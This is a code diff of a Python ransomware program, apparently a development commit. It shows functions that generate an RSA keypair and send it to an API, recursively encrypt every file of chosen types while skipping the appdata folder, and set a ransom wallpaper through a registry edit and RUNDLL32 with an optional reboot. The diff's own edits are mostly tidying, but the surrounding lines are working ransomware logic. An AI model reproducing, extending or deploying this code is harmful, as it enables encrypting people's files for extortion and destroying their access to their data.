@@ -1,18 +1,18 @@
+import sys
+import platform
+import uuid
+import json
+import os
+import time
+import shutil
+import base64
+import requests
+import Config
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.backends import default_backend
 from PyQt5.QtWidgets import QApplication
 from RSA.RSAKeyGen import RSAKeyGen
-import base64
-import sys
-import platform
-import uuid
-import Config
-import json
-import os
-import time
-import requests
-import shutil
 from pathlib import Path
 from Helper import Helper
 from FileCrypter import FileCrypter
@@ -44,7 +44,7 @@ def startGui(id):
     if sys.platform == "linux" or sys.platform == "linux2":
         if not os.environ.get('XDG_CURRENT_DESKTOP') is None:
             app = QApplication(sys.argv)
-            oMainwindow = GUI(id)
+            _ = GUI(id)
             sys.exit(app.exec_())
         else:
             _helper.super_logo()
@@ -53,7 +53,7 @@ def startGui(id):
             print("Have a nice Day! ;)")
     else:
         app = QApplication(sys.argv)
-        oMainwindow = GUI(id)
+        _ = GUI(id)
         sys.exit(app.exec_())
 
 def makePersistence():
@@ -77,7 +77,7 @@ def makePersistence():
             file_out = str(Path.home()) + '/wp.bmp'
             if len(img.split()) == 4:
                 # prevent IOError: cannot write mode RGBA as BMP
-                r, g, b, a = img.split()
+                r, g, b, _ = img.split()
                 img = Image.merge("RGB", (r, g, b))
                 img.save(file_out)
             else:
@@ -86,7 +86,7 @@ def makePersistence():
             file_out = file_out.replace('/', '\\')
             os.system('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d ' + file_out + ' /f')
             time.sleep(1)
-            os.system('RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters')          
+            os.system('RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters')
             if Config.WIN_SHOULD_REBOOT:
                 time.sleep(1)
                 #reboot for wallpaper change
@@ -107,6 +107,7 @@ def makePersistence():
 
 
 def genKeyPair():
+    """Generates the Keypair and sends it to the API"""
     keys = RSAKeyGen()
     _helper.info("Public/Private Keypair generated!")
     cipher_cpriv_key = base64.b64encode(encryptClientPrivKey(keys.getPrivateKeyAsStr()))
@@ -139,12 +140,14 @@ def encryptAllFiles(keys):
         pathlist.extend(Path(p).glob('**/*.' + types))
     for path in pathlist:
         path_in_str = str(path)
-        fc = FileCrypter()
-        try:
-            fc.encrypt_file(path_in_str, keys.getPublicKeyAsStr())
-            _helper.info("Encrypted " + path_in_str)
-        except IOError:
-            _helper.error("Could not encrypt " + path_in_str)
+        #skip appdata dir
+        if 'appdata' not in path_in_str.lower():
+            fc = FileCrypter()
+            try:
+                fc.encrypt_file(path_in_str, keys.getPublicKeyAsStr())
+                _helper.info("Encrypted " + path_in_str)
+            except IOError:
+                _helper.error("Could not encrypt " + path_in_str)
 
 
 def encryptClientPrivKey(priv_key):
